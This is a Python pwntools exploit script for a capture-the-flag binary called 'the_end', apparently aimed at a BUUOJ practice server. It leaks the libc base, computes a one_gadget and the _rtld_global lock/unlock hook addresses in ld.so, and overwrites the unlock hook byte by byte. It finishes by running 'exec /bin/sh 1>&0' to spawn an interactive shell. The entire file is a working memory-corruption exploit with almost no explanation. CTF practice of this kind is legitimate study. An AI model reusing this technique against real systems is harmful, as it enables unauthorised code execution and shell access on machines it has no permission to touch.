#!/usr/bin/env python
# -*- coding: utf-8 -*-
# 
from pwn import *
# context.log_level = 'debug'
# context.terminal = ['deepin-terminal', '-x', 'sh', '-c']
context.binary = './the_end'
success = lambda name, value: log.success('{} -> {:#x}'.format(name, value))
def debug():
    if local == 0:
        return
    binaryname = str(context.binary).split('/')[-1].replace("')", '')
    interruptPoint=[]
    pid = int(os.popen('pgrep {}'.format(binaryname)).readlines()[-1])
    maps = os.popen('cat /proc/{}/maps'.format(pid))
    ELFaddr = 0
    libcaddr = 0
    for inf in maps.readlines():
        if ELFaddr == 0:
            if binaryname in inf:
                ELFaddr = int(inf.split('-', 1)[0], 16)
        if libcaddr == 0:
            if 'libc' in inf:
                libcaddr = int(inf.split('-', 1)[0], 16)
    info('pid : {}'.format(pid))
    success('elfbase', ELFaddr)
    success('libcbase', libcaddr)
    if len(interruptPoint) :
        for p in interruptPoint:
            success('interruptPoint', p+ELFaddr)
    raw_input('debug>')

local = 0
if local:
    io = process('./the_end', env = {'LD_PRELOAD': '../libc-2.27-x64.so'})
    libc = ELF('../libc-2.27-x64.so')
else:
    io =remote('node3.buuoj.cn', 25670)
    libc = ELF('../libc-2.27-x64.so')

libcbase = int(io.recvline()[15:29], 16) - libc.sym['sleep']
success('libcbase', libcbase)

one_gadget = libcbase+0x4f322
success('one_gadget', one_gadget)

ldbase = libcbase + 0x3f1000
success('ldbase', ldbase)

# pwndbg> distance 0x7ffff79e4000 0x7ffff7dd5000
# 0x7ffff79e4000->0x7ffff7dd5000 is 0x3f1000 bytes (0x7e200 words)

# rtld_global = ld.symbols['_rtld_global']
rtld_global = ldbase + 0x228060
success('rtld_global', rtld_global)
'''
pwndbg> p &_rtld_global._dl_rtld_unlock_recursive
$6 = (void (**)(void *)) 0x7ffff7ffdf68 <_rtld_global+3848>
pwndbg> p &_rtld_global._dl_rtld_lock_recursive
$7 = (void (**)(void *)) 0x7ffff7ffdf60 <_rtld_global+3840>

'''
unlock = rtld_global + 0xf08
lock = rtld_global + 0xf00 


debug()
for i in range(5):
    raw_input(hex(unlock + i))
    io.send(p64(unlock+i))
    io.send(p64(one_gadget)[i])

io.sendline("exec /bin/sh 1>&0")
io.interactive()


